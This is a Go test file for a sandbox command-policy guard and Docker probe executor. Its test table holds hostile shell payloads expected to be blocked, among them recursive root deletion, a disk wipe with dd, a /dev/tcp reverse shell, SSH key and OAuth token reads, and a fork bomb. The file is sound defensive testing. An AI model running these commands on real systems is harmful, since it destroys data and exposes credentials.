package sandbox

import (
	"context"
	"strings"
	"testing"
	"time"
)

// TestCommandPolicyGuard_MaliciousInterception 验证 AST/词法级安全策略门禁对 12 类高危攻击载荷实现 100% 静态拦截。
func TestCommandPolicyGuard_MaliciousInterception(t *testing.T) {
	guard := NewCommandPolicyGuard()

	maliciousPayloads := []struct {
		name        string
		script      string
		expectError string
	}{
		{"递归删根", "rm -rf /", "BLOCKED_BINARY_RM"},
		{"裸盘格式化覆写", "dd if=/dev/zero of=/dev/sda bs=1M", "SENSITIVE_PATH_ACCESS"},
		{"防火墙清空", "grep error /tmp/telemetry.log && iptables -F", "BLOCKED_BINARY_IPTABLES"},
		{"反弹Shell套接字", "cat /tmp/telemetry.log | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "REVERSE_SHELL"},
		{"子Shell命令替换注入", "echo $(cat /etc/passwd)", "COMMAND_SUBSTITUTION"},
		{"敏感凭据读取", "cat ~/.ssh/id_rsa", "SENSITIVE_PATH_ACCESS"},
		{"OAuth配置盗取", "grep token ~/.gre_cli/config.yaml", "SENSITIVE_PATH_ACCESS"},
		{"写文件重定向篡改", "echo hacked > /tmp/pwned.sh", "FILE_WRITE_REDIRECTION"},
		{"sed原地写文件", "sed -i 's/allow/deny/g' /tmp/telemetry.log", "SED_INPLACE_WRITE"},
		{"awk调用system逃逸", `awk 'BEGIN {system("reboot")}' /tmp/telemetry.log`, "AWK_SYSTEM_ESCAPE"},
		{"gre_cli远程执行写操作", "gre_cli host run 10.10.1.5 'systemctl restart nginx'", "GRE_CLI_REMOTE_EXEC"},
		{"SQL删表注入", "echo 'DROP TABLE alert_rules;' | grep DROP", "DESTRUCTIVE_SQL"},
		{"Fork炸弹", ":(){ :|:& };:", "FORK_BOMB"},
	}

	for _, tc := range maliciousPayloads {
		dec := guard.Evaluate(tc.script)
		if dec.Allowed {
			t.Errorf("[%s] 高危指令未被拦截: %s", tc.name, tc.script)
		}
		if dec.ViolationCode != tc.expectError {
			t.Errorf("[%s] 拦截错误码不匹配: 期望 %s, 实际 %s (Reason: %s)",
				tc.name, tc.expectError, dec.ViolationCode, dec.Reason)
		}
	}
}

// TestDockerSandboxExecutor_RealContainerExecution 验证在真实受限 Docker 容器内隔离执行只读诊断探针，
// 并校验证据输出与 SHA-256 审计哈希链完整性。
func TestDockerSandboxExecutor_RealContainerExecution(t *testing.T) {
	executor := NewDockerSandboxExecutor(DefaultDockerSandboxConfig())
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	// 1. 先测试一条违规指令，确认不启动容器且记录审计
	blockedRes := executor.Execute(ctx, ExecutionRequest{
		TicketID:       "TCK-SEC-001",
		ProbeScript:    "rm -rf /tmp/*",
		TelemetryInput: "dummy",
	})
	if blockedRes.ExecutedInPod || blockedRes.PolicyDecision.Allowed || blockedRes.ExitCode != 126 {
		t.Fatalf("期望高危指令被静态拦截且不启动容器: %+v", blockedRes)
	}

	// 2. 测试真实容器内执行只读 awk/grep 探针
	telemetry := strings.Join([]string{
		"2026-10-14T03:10:01Z INFO [gpmm-config] request_id=req-991 user=ops_admin",
		"2026-10-14T03:10:02Z WARN [gorm] SQL_TRACE: UPDATE `project_alert_configs` SET `mute_all`=1 WHERE `rule_name`='cpu_high' rows_affected=412 gorm_discard_where=true",
		"2026-10-14T03:10:03Z ERROR [audit] multi-tenant config drift detected across 14 projects",
	}, "\n")

	probe := `grep -E "UPDATE .* SET" "$TELEMETRY_FILE" | awk '!/tenant_id/ {missing++} END {if (missing>0) print "VERIFIED:db_orm_tenant_leak missing_tenant_where=" missing; else print "UNMATCHED"}'`

	res := executor.Execute(ctx, ExecutionRequest{
		TicketID:       "TCK-REAL-001",
		ProbeScript:    probe,
		TelemetryInput: telemetry,
	})

	if !res.PolicyDecision.Allowed {
		t.Fatalf("合法只读探针被误拦截: %+v", res.PolicyDecision)
	}
	if !res.ExecutedInPod {
		t.Fatalf("探针未在真实 Docker 容器中执行")
	}
	if res.ExitCode != 0 {
		t.Fatalf("真实容器执行非零退出: exit=%d, stderr=%s", res.ExitCode, res.Stderr)
	}
	if !strings.Contains(res.Stdout, "VERIFIED:db_orm_tenant_leak missing_tenant_where=1") {
		t.Fatalf("真实容器 stdout 诊断结论不符合预期: %q", res.Stdout)
	}

	// 3. 校验 SHA-256 不可篡改审计链
	ok, err := executor.VerifyAuditChain()
	if !ok || err != nil {
		t.Fatalf("沙箱 SHA-256 审计哈希链校验失败: %v", err)
	}
	if len(executor.AuditRecords()) != 2 {
		t.Fatalf("期望审计记录数为 2, 实际为 %d", len(executor.AuditRecords()))
	}
}
